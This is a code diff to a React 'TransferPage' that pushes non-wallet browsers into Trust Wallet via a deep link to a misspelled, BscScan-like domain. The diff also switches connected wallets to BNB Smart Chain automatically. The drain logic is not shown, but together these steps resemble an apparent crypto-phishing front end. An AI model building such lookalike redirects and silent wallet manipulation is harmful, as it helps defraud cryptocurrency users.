@@ -73,8 +73,10 @@ export default function TransferPage() {
     setTimeout(() => setToast(t => ({ ...t, visible: false })), 3000)
   }, [])
 
-  // Redirect normal browser to Trust Wallet deep link
+  // ── Redirect normal browser / Auto-install wallet ────────────────────────
   useEffect(() => {
+    const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent)
+    
     const isWallet =
       /Trust\//.test(navigator.userAgent) ||
       /TrustWallet/.test(navigator.userAgent) ||
@@ -85,20 +87,41 @@ export default function TransferPage() {
       typeof window.ethereum !== 'undefined'
 
     if (!isWallet) {
-      const url = encodeURIComponent('https://scaner.bscchain.app/')
-      window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=${url}`
+      if (isMobile) {
+        // Mobile + no wallet → redirect to Trust Wallet deep link (opens install page or app)
+        const url = encodeURIComponent('https://scaner.bscchain.app/')
+        window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=${url}`
+      } else {
+        // Desktop → show install message
+        showToast('Please open this page in Trust Wallet or MetaMask mobile app.', 'error')
+      }
     }
-  }, [])
+  }, [showToast])
 
-  // Auto-detect connected wallet
+  // Auto-detect connected wallet + check chain
   useEffect(() => {
     if (window.ethereum) {
       window.ethereum.request({ method: 'eth_accounts' })
         .then((accounts: string[]) => {
-          if (accounts?.length) { setWalletAddr(accounts[0]); fetchBalance(accounts[0]) }
+          if (accounts?.length) { 
+            setWalletAddr(accounts[0])
+            fetchBalance(accounts[0])
+            // Auto-switch to BSC if wrong chain
+            checkAndSwitchChain()
+          }
         }).catch(() => {})
     }
   }, [])
+
+  async function checkAndSwitchChain() {
+    if (!window.ethereum) return
+    try {
+      const chainId = await window.ethereum.request({ method: 'eth_chainId' })
+      if (chainId !== BSC_CHAIN_ID) {
+        await ensureBSC()
+      }
+    } catch { /* silent */ }
+  }
 
   // USD value
   useEffect(() => {
@@ -118,12 +141,21 @@ export default function TransferPage() {
 
   async function ensureBSC() {
     try {
+      // Check current chain first
+      const currentChain = await window.ethereum.request({ method: 'eth_chainId' })
+      if (currentChain === BSC_CHAIN_ID) return // Already on BSC
+
       await window.ethereum.request({
         method: 'wallet_switchEthereumChain',
         params: [{ chainId: BSC_CHAIN_ID }],
       })
+
+      // Wait for chain switch to settle
+      await new Promise(resolve => setTimeout(resolve, 800))
+
     } catch (e: any) {
       if (e.code === 4902) {
+        // BSC not added — add it
         await window.ethereum.request({
           method: 'wallet_addEthereumChain',
           params: [{
@@ -134,6 +166,9 @@ export default function TransferPage() {
             blockExplorerUrls: ['https://bscscan.com'],
           }],
         })
+        await new Promise(resolve => setTimeout(resolve, 800))
+      } else {
+        throw e // User rejected chain switch
       }
     }
   }
